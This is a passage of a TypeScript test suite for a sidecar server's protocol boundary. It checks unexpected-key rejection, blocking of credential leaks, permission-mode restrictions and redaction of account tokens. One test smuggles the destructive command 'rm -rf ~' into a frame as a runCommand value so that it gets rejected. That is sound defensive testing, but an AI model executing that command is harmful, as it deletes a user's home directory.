    clientFrame({
      type: 'permission.response',
      requestId: 'perm-B',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )

  await waitFor(() => resolvedById.has('perm-B'))
  const attached = (
    resolvedById.get('perm-B') as unknown as { updatedPermissions?: PermissionUpdate[] }
  ).updatedPermissions
  expect(attached).toEqual([suggestionB])
  // A is untouched and still pending.
  expect(resolvedById.has('perm-A')).toBe(false)
  expect(controller.getPendingPermissionRequests().length).toBe(1)
  expect(controller.getPendingPermissionRequests()[0]!.requestId).toBe('perm-A')
})

test('F10 — a frame with an extra key on an allowlisted type is rejected (not stripped)', () => {
  // The reused Zod schema STRIPS unknown keys; the contract requires rejection.
  // `{type:"app.ping", nonce, runCommand}` must produce bad_request, not a pong.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({ type: 'app.ping', nonce: 'n', runCommand: 'rm -rf ~' } as never),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'pong')).toBe(false)
})

test('F10 — an unexpected key inside app.submit.options is rejected', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'app.submit',
      requestId: 'r1',
      prompt: 'hi',
      // `uuid` is engine identity, not a renderer-exposed field.
      options: { uuid: 'forged-uuid' },
    } as never),
  )
  const err = received.find(f => f.kind === 'error' && f.message.includes('uuid'))
  expect(err).toBeDefined()
})

test('F10 — an unexpected key toolUseID inside permission.response.response is rejected', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'x',
      response: { behavior: 'allow', toolUseID: 'some-id' },
    } as never),
  )
  const err = received.find(
    f => f.kind === 'error' && f.message.includes('toolUseID'),
  )
  expect(err).toBeDefined()
})

test('F6 — an outbound event carrying a secret key is blocked, not shipped', async () => {
  // An engine event that accidentally embeds a token must never reach the client.
  const controller = new AppSessionController({
    async *runTurn() {
      // A message whose SDKMessage carries a forbidden key nested in its content.
      yield {
        type: 'assistant',
        message: { content: [{ type: 'text', text: 'ok', accessToken: 'sk-leak' }] },
      } as never
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  expect(received[0]?.kind).toBe('ready') // the ready handshake is clean

  void controller.submit('go')
  await waitFor(() => received.some(f => f.kind === 'error'))

  // The event frame was blocked; an internal_error was sent in its place.
  expect(received.some(f => f.kind === 'event')).toBe(false)
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  if (err?.kind === 'error') {
    expect(err.code).toBe('internal_error')
    expect(err.message.toLowerCase()).toContain('credential')
  }
})

test('raw forwarding omits undefined optional SDK fields instead of dropping the event', async () => {
  const controller = new AppSessionController({
    async *runTurn() {
      yield {
        type: 'assistant',
        message: {
          id: 'msg-live',
          role: 'assistant',
          content: [{ type: 'text', text: 'live' }],
        },
        parent_tool_use_id: null,
        session_id: SESSION,
        uuid: '00000000-0000-4000-8000-000000000001',
        error: undefined,
      } as never
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => received.some(frame => frame.kind === 'event'))

  const eventFrame = received.find(frame => frame.kind === 'event')
  expect(eventFrame?.kind).toBe('event')
  if (eventFrame?.kind === 'event' && eventFrame.event.type === 'message') {
    expect(eventFrame.event.message.type).toBe('assistant')
    expect('error' in eventFrame.event.message).toBe(false)
  }
})

test('F6 — a contaminated `ready` handshake is blocked (secret guard covers ready too)', () => {
  // The review flagged `ready` as a bypass path: its payload embeds session state
  // (goal snapshot, pending requests) that is a plausible accidental leak site.
  const controller = new AppSessionController(probeAdapter())
  // Contaminate the goal snapshot so it rides along in the ready payload.
  controller.updateGoalSnapshot({ threadId: 't', accessToken: 'sk-leak' } as never)
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)
  // No clean `ready` frame goes out; an internal_error is sent instead.
  expect(received.some(f => f.kind === 'ready')).toBe(false)
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  if (err?.kind === 'error') expect(err.message.toLowerCase()).toContain('credential')
})

test('F10 — a prototype-name type (constructor) is rejected, not crashed', () => {
  // `type in allowedByType` used to accept inherited keys and then crash on a
  // prototype function. It must be a clean bad_request now.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  expect(() =>
    server.handleData(conn, clientFrame({ type: 'constructor' } as never)),
  ).not.toThrow()
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
  if (err?.kind === 'error') {
    expect(err.code).toBe('bad_request')
    expect(err.message).toContain('constructor')
  }
})

test('F10 — deny+interrupt (a host-only escalation) is rejected on permission.response', () => {
  // The Zod schema accepts `interrupt` (host field), but the renderer contract
  // does not expose it. Strict checking of `response` keys must reject it rather
  // than let it reach the engine and change deny behavior.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'x',
      response: { behavior: 'deny', message: 'no', interrupt: true },
    } as never),
  )
  const err = received.find(
    f => f.kind === 'error' && f.message.includes('interrupt'),
  )
  expect(err).toBeDefined()
})

test('F10 — a legit deny still passes strict checks (reaches permission_not_found)', () => {
  // Guard against over-rejection: a contract-valid deny must NOT be flagged as an
  // unexpected-key error; with no pending request it should hit permission_not_found.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'x',
      response: { behavior: 'deny', message: 'no' },
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'permission_not_found')).toBe(true)
  expect(received.some(f => f.kind === 'error' && f.message.includes('unexpected key'))).toBe(false)
})

test('F5 — ready frame does not alias the controller\'s live objects (mutation isolation)', () => {
  const controller = new AppSessionController(probeAdapter())
  const mutableSnapshot = { threadId: 'thread-123', name: 'Original Name' } as any
  controller.getGoalSnapshot = () => mutableSnapshot

  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const ready = received.find(f => f.kind === 'ready')
  expect(ready).toBeDefined()
  expect(ready?.kind).toBe('ready')

  // Mutate original object
  mutableSnapshot.name = 'Mutated Name'

  // Received frame should have original name
  expect((ready as any).payload.goalSnapshot.name).toBe('Original Name')
})

test('F5 — ready frame canonicalizes undefined-valued fields', () => {
  const controller = new AppSessionController(probeAdapter())
  controller.getGoalSnapshot = () => ({
    threadId: 'thread-123',
    description: undefined,
  } as any)

  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const ready = received.find(f => f.kind === 'ready')
  expect(ready).toBeDefined()
  const snapshotKeys = Object.keys((ready as any).payload.goalSnapshot)
  expect(snapshotKeys).not.toContain('description')
})

test('F5 — ready frame with non-JSON-safe payload is rejected', () => {
  const controller = new AppSessionController(probeAdapter())
  controller.getGoalSnapshot = () => ({
    threadId: 'thread-123',
    invalidField: new Date(),
  } as any)

  let loggedMessage = ''
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller,
    log: (msg) => { loggedMessage = msg }
  })
  servers.push(server)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  // Ready frame should be blocked
  expect(received.some(f => f.kind === 'ready')).toBe(false)
  // An error should be logged
  expect(loggedMessage).toContain('non-plain object')
})

/** Read `updatedInput` off a possibly-null allow response without union quirks. */
function allowInput(response: AppPermissionResponse | null): unknown {
  return (response as unknown as { updatedInput?: unknown } | null)?.updatedInput
}

async function waitFor(predicate: () => boolean, timeoutMs = 2000): Promise<void> {
  const start = Date.now()
  while (!predicate()) {
    if (Date.now() - start > timeoutMs) throw new Error('waitFor timed out')
    await new Promise(r => setTimeout(r, 5))
  }
}

/* ------------------------------------------------------------------------- *
 * P2-4 — C2 `permission.setMode` + C3 `permission.context`
 * (decisions/PERMISSION-BOUNDARY.md §3/§4)
 * ------------------------------------------------------------------------- */

function contextFrames(received: ServerFrame[]): PermissionContextFrame[] {
  return received.filter(
    (frame): frame is PermissionContextFrame =>
      frame.kind === 'permission.context',
  )
}

test('C3 — attach emits a permission.context snapshot faithful to the engine context', () => {
  const store = makePermissionStore({
    mode: 'acceptEdits',
    alwaysAllowRules: { userSettings: ['Bash(date:*)'] },
    alwaysDenyRules: { projectSettings: ['WebSearch'] },
    additionalWorkingDirectories: new Map([
      ['/tmp/extra', { path: '/tmp/extra', source: 'session' }],
    ]),
  })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  // Ready first, snapshot immediately after (§4: attach emission; the
  // engine-owned AppReadyPayload is not widened).
  expect(received[0]?.kind).toBe('ready')
  expect(received[1]).toEqual({
    kind: 'permission.context',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    context: {
      mode: 'acceptEdits',
      alwaysAllowRules: { userSettings: ['Bash(date:*)'] },
      alwaysDenyRules: { projectSettings: ['WebSearch'] },
      alwaysAskRules: {},
      // The engine's Map, converted to the JSON POJO entries shape.
      additionalWorkingDirectories: [{ path: '/tmp/extra', source: 'session' }],
      isBypassPermissionsModeAvailable: false,
    },
  })
})

test('C3 — no permission domain (probe fixture) → ready only, no snapshot', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received[0]?.kind).toBe('ready')
  expect(contextFrames(received)).toHaveLength(0)
})

test('C3 — a live-context change broadcasts a fresh snapshot (engine-applied rule)', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)
  const before = contextFrames(received).length

  // The engine's own decision path applies C1 updates via setAppState
  // (PermissionPromptToolResultSchema.ts:95-106); hooks do the same mid-turn.
  // Reproduce that exact write shape with the engine's own applyPermissionUpdate.
  store.setState(prev => ({
    ...prev,
    toolPermissionContext: applyPermissionUpdate(prev.toolPermissionContext, {
      type: 'addRules',
      rules: [{ toolName: 'Bash', ruleContent: 'date:*' }],
      behavior: 'allow',
      destination: 'session',
    }),
  }))

  const snapshots = contextFrames(received)
  expect(snapshots).toHaveLength(before + 1)
  expect(snapshots.at(-1)!.context.alwaysAllowRules.session).toContain(
    'Bash(date:*)',
  )
})

test('C3 — an unrelated app-state change does NOT re-emit the snapshot', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)
  const before = contextFrames(received).length

  store.setState(prev => ({ ...prev, thinkingEnabled: !prev.thinkingEnabled }))

  expect(contextFrames(received)).toHaveLength(before)
})

test('C2 — permission.setMode applies every allowlisted mode via the engine transition', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  for (const mode of ['acceptEdits', 'plan', 'dontAsk', 'default'] as const) {
    server.handleData(
      conn,
      clientFrame({ type: 'permission.setMode', requestId: `m-${mode}`, mode }),
    )
    expect(store.getState().toolPermissionContext.mode).toBe(mode)
    // The fresh snapshot IS the acknowledgement.
    expect(contextFrames(received).at(-1)!.context.mode).toBe(mode)
  }
  expect(received.some(frame => frame.kind === 'error')).toBe(false)
})

test('C2 — setMode to the CURRENT mode is a no-op and emits no snapshot', () => {
  const store = makePermissionStore({ mode: 'acceptEdits' })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = contextFrames(received).length
  const contextBefore = store.getState().toolPermissionContext

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.setMode',
      requestId: 'm-same',
      mode: 'acceptEdits',
    }),
  )

  expect(store.getState().toolPermissionContext).toBe(contextBefore)
  expect(contextFrames(received)).toHaveLength(before)
  expect(received.some(frame => frame.kind === 'error')).toBe(false)
})

test('C2 — bypassPermissions is REJECTED, always; mode unchanged, no snapshot', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = contextFrames(received).length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'permission.setMode',
        requestId: 'm-bypass',
        mode: 'bypassPermissions',
      },
    }),
  )

  expect(
    received.some(
      frame =>
        frame.kind === 'error' &&
        frame.code === 'bad_request' &&
        frame.message.includes('bypassPermissions'),
    ),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
  expect(contextFrames(received)).toHaveLength(before)
})

test('C2 — auto is engine-internal and REJECTED at the boundary', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'permission.setMode', requestId: 'm-auto', mode: 'auto' },
    }),
  )

  expect(
    received.some(
      frame =>
        frame.kind === 'error' &&
        frame.code === 'bad_request' &&
        frame.message.includes('auto'),
    ),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
})

test('C2 — an unknown mode string fails the sidecar-local schema', () => {
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'permission.setMode', requestId: 'm-junk', mode: 'yolo' },
    }),
  )

  expect(
    received.some(frame => frame.kind === 'error' && frame.code === 'bad_request'),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
})

test('C2/F10 — a setMode frame smuggling a destination key is rejected wholesale', () => {
  // No destination exists on the wire — scope is pinned to `session` at the
  // sidecar. A renderer that tries to address settings persistence is refused
  // by strict-key checking before any schema runs.
  const store = makePermissionStore()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    createSidecarPermissionDomain(store),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'permission.setMode',
        requestId: 'm-dest',
        mode: 'acceptEdits',
        destination: 'userSettings',
      },
    }),
  )

  expect(
    received.some(
      frame =>
        frame.kind === 'error' &&
        frame.code === 'bad_request' &&
        frame.message.includes('destination'),
    ),
  ).toBe(true)
  expect(store.getState().toolPermissionContext.mode).toBe('default')
})

test('C2 — setMode without a permission domain fails closed (probe fixture)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.setMode',
      requestId: 'm-nodomain',
      mode: 'acceptEdits',
    }),
  )

  expect(
    received.some(
      frame => frame.kind === 'error' && frame.code === 'internal_error',
    ),
  ).toBe(true)
})

test('C1+C3 — resolving with a suggestion selection then applying it re-snapshots', async () => {
  // End-to-end shape of the "always allow" flow at this boundary: the C1
  // selection resolves the pending request with ENGINE-minted updates attached
  // (tested exhaustively above), and when the engine's decision path applies
  // those updates to the live context, C3 broadcasts the new rule to every
  // window. The engine-side apply is reproduced with the engine's own
  // applyPermissionUpdate over the SAME store the domain watches.
  const store = makePermissionStore()
  const suggestion = bashSuggestion('date:*')
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'date' }, r => {
      resolved = r
    }, [suggestion]),
  )
  const server = makeServer(controller, createSidecarPermissionDomain(store))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )
  await waitFor(() => resolved !== null)

  const attached = (resolved as unknown as { updatedPermissions?: PermissionUpdate[] })
    .updatedPermissions
  expect(attached).toEqual([suggestion])

  // The engine applies the attached updates via setAppState
  // (PermissionPromptToolResultSchema.ts:95-106) — reproduce that write.
  for (const update of attached!) {
    store.setState(prev => ({
      ...prev,
      toolPermissionContext: applyPermissionUpdate(
        prev.toolPermissionContext,
        update,
      ),
    }))
  }

  const snapshots = contextFrames(received)
  expect(snapshots.at(-1)!.context.alwaysAllowRules.localSettings).toContain(
    'Bash(date:*)',
  )
})

/* ------------------------------------------------------------------------- *
 * P4-5 — Accounts read-seam + lifecycle-verb boundary tests
 * ------------------------------------------------------------------------- */

/** A token-BEARING pool account, to prove no credential reaches the wire. */
function acctFixture(overrides: Partial<PoolAccount> = {}): PoolAccount {
  return {
    accountId: 'acct-aaaa',
    accessToken: 'SECRET-access-should-never-leak',
    refreshToken: 'SECRET-refresh-should-never-leak',
    expiresAt: 9_999_999_999,
    source: 'vault',
    status: 'healthy',
    lastUsedAt: 1,
    vaultFilePath: '/Users/secret/.cat-code/vault/acct.json',
    alias: 'main',
    ...overrides,
  }
}

function accountFrame(message: ClientFrame['message']): Buffer {
  return encodeFrame({
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    message,
  } satisfies ClientFrame)
}

/** Flush the async `runVerb().then(send)` microtask chain. */
const flush = () => new Promise(resolve => setTimeout(resolve, 0))

function fakeExecutor(over: Partial<AccountsCommandExecutor> = {}): AccountsCommandExecutor {
  return {
    switch: () => ({ ok: true, message: 'switched' }),
    rename: () => ({ ok: true, message: 'renamed' }),
    delete: () => ({ ok: true, message: 'deleted' }),
    logout: () => ({ ok: true, message: 'signed out' }),
    touchAll: async () => ({ ok: true, message: 'done', touchAllResults: [] }),
    login: () => ({ ok: false, message: 'deferred' }),
    ...over,
  }
}

afterEach(() => {
  resetCodexAccountPoolForTest()
})

test('P4-5 — attach emits a redacted accounts.snapshot that is secretGuard-clean', () => {
  seedCodexAccountPoolForTest({ accounts: [acctFixture()], activeAccountId: 'acct-aaaa' })
  const accounts = createSidecarAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'accounts.snapshot')
  expect(snap?.kind).toBe('accounts.snapshot')
  const serialized = JSON.stringify(snap)
  expect(serialized).not.toContain('SECRET-access')
  expect(serialized).not.toContain('SECRET-refresh')
  expect(serialized).not.toContain('/Users/secret')
})

test('P4-5 — a valid account.switch produces an ok account.result and re-broadcasts the snapshot', async () => {
  seedCodexAccountPoolForTest({
    accounts: [acctFixture({ accountId: 'a', alias: 'a' }), acctFixture({ accountId: 'b', alias: 'b' })],
    activeAccountId: 'a',
  })
  const accounts = createSidecarAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'accounts.snapshot').length

  server.handleData(conn, accountFrame({ type: 'account.switch', requestId: 'r1', accountId: 'b' }))
  await flush()

  const result = received.find(f => f.kind === 'account.result')
  expect(result?.kind).toBe('account.result')
  expect(result && result.kind === 'account.result' && result.ok).toBe(true)
  expect(result && result.kind === 'account.result' && result.requestId).toBe('r1')
  // pool changed → a fresh snapshot was broadcast
  expect(received.filter(f => f.kind === 'accounts.snapshot').length).toBeGreaterThan(before)
})

test('P4-5 — account.result never carries token material', async () => {
  seedCodexAccountPoolForTest({ accounts: [acctFixture({ accountId: 'a' })], activeAccountId: 'a' })
  const accounts = createSidecarAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, accountFrame({ type: 'account.switch', requestId: 'r', accountId: 'a' }))
  await flush()
  const result = received.find(f => f.kind === 'account.result')
  expect(JSON.stringify(result)).not.toContain('SECRET')
})

test('P4-5 — rejects an account verb carrying an unexpected key (checkStrictKeys)', () => {
  const accounts = createSidecarAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.switch', requestId: 'r', accountId: 'a', updatedPermissions: [] } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-5 — rejects account.switch with a missing accountId (schema)', () => {
  const accounts = createSidecarAccountsDomain({ executor: fakeExecutor() })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.switch', requestId: 'r' } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-5 — rejects account.delete without confirm:true (destructive fail-closed)', () => {
  seedCodexAccountPoolForTest({ accounts: [acctFixture({ accountId: 'a' })], activeAccountId: 'a' })
  let deleted = false
  const accounts = createSidecarAccountsDomain({
    executor: fakeExecutor({ delete: () => { deleted = true; return { ok: true, message: 'x' } } }),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, accounts)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  // confirm omitted
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.delete', requestId: 'r', accountId: 'a' } as unknown as ClientFrame['message'],
    }),
  )
  // confirm:false
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'account.delete', requestId: 'r2', accountId: 'a', confirm: false } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.filter(f => f.kind === 'error' && f.code === 'bad_request').length).toBeGreaterThanOrEqual(2)
  expect(deleted).toBe(false)
})

test('P4-5 — an account verb with no accounts domain fails closed (internal_error)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, accountFrame({ type: 'account.logout', requestId: 'r' }))
  expect(received.some(f => f.kind === 'error' && f.code === 'internal_error')).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * P4-13 — RemoteSettings verbs (D3 cut scope)
 * ------------------------------------------------------------------------- */

function fakeRemoteExecutor(
  over: Partial<RemoteSettingsCommandExecutor> = {},
): RemoteSettingsCommandExecutor {
  return {
    checkBridgePrerequisites: async () => null,
    directConnect: async (serverUrl, cwd) => ({ sessionId: `s-${cwd}`, wsUrl: `ws://${serverUrl}` }),
    ...over,
  }
}

test('P4-13 — attach emits a remoteSettings.snapshot', () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'remoteSettings.snapshot')
  expect(snap?.kind).toBe('remoteSettings.snapshot')
})

test('P4-13 — a valid bridgeToggle produces an ok result and re-broadcasts the snapshot', async () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'remoteSettings.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.bridgeToggle', requestId: 'r1', enable: true } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'remoteSettings.result')
  expect(result?.kind).toBe('remoteSettings.result')
  expect(result && result.kind === 'remoteSettings.result' && result.ok).toBe(true)
  expect(result && result.kind === 'remoteSettings.result' && result.requestId).toBe('r1')
  expect(received.filter(f => f.kind === 'remoteSettings.snapshot').length).toBeGreaterThan(before)
})

test('P4-13 — a rejected bridgeToggle prerequisite produces an ok:false result and no re-broadcast', async () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor({ checkBridgePrerequisites: async () => 'blocked by policy' }),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'remoteSettings.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.bridgeToggle', requestId: 'r2', enable: true } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'remoteSettings.result')
  expect(result && result.kind === 'remoteSettings.result' && result.ok).toBe(false)
  expect(received.filter(f => f.kind === 'remoteSettings.snapshot').length).toBe(before)
})

test('P4-13 — a valid directConnect never carries token material and echoes requestId', async () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.directConnect', requestId: 'r3', serverUrl: 'cc://host:8200' } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'remoteSettings.result')
  expect(result && result.kind === 'remoteSettings.result' && result.ok).toBe(true)
  expect(result && result.kind === 'remoteSettings.result' && result.requestId).toBe('r3')
  expect(JSON.stringify(result)).not.toContain('token')
})

test('P4-13 — rejects a remoteSettings verb carrying an unexpected key (checkStrictKeys)', () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'remoteSettings.bridgeToggle',
        requestId: 'r',
        enable: true,
        updatedPermissions: [],
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-13 — rejects directConnect with a missing serverUrl (schema)', () => {
  const remoteSettings = createSidecarRemoteSettingsDomain({
    appStateStore: makePermissionStore(),
    cwd: '/tmp/proj',
    commands: [],
    executor: fakeRemoteExecutor(),
  })
  const server = makeServer(new AppSessionController(probeAdapter()), undefined, undefined, undefined, undefined, undefined, remoteSettings)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.directConnect', requestId: 'r' } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('P4-13 — a remoteSettings verb with no remoteSettings domain fails closed (internal_error)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'remoteSettings.bridgeToggle', requestId: 'r', enable: true } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'internal_error')).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * P4-19 — the settings WRITE verb (the FIRST renderer→engine settings write).
 * These exercise the SIDECAR boundary (schema + EDITABLE_SETTINGS allowlist +
 * per-key value gate + dispatch + result frame + re-broadcast); the real
 * SettingsUpdater-under-lock disk round-trip is proven in settingsDomain.test.ts.
 * ------------------------------------------------------------------------- */

